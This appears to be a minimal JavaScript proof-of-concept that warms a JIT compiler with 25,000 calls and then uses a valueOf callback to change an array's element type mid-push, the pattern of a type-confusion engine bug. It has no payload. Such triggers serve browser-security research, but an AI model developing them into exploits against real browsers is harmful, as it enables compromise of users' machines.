function poc(trigger) {
    let arr = [1, 2];
    const trigger_obj = {
        valueOf: () => {
            if (trigger) {
                arr[0] = 1.1;
            }
            return 3;
        }
    };
    arr.push(trigger_obj);
}

for (let i = 0; i < 25000; i++) {
    poc(false);
}

poc(true);